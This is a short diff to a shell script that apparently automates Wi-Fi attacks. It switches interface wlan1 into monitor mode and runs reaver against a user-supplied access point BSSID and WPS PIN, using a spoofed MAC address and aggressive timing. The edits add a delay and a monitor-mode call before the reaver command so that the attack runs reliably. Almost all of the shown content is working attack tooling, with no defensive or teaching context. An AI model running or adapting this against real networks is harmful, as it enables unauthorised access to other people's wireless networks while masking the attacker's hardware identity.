@@ -38,6 +38,7 @@ monitor() {
 	iwconfig wlan1 txpower 20
 	iwconfig wlan1 mode monitor
 	ifconfig wlan1 up
+	sleep 3
 }
 
 one() {
@@ -76,6 +77,7 @@ three() {
 	read BSSID
 	echo "Please enter the PIN : "
 	read PIN
+	monitor
 	reaver -i wlan1 -b $BSSID -E -S -vv -N -T 1 -t 20 -d 0 -l 420 -p $PIN -m 9e:49:1f:d6:37:f4
 	ifconfig wlan1 down # Switch off
 	pause
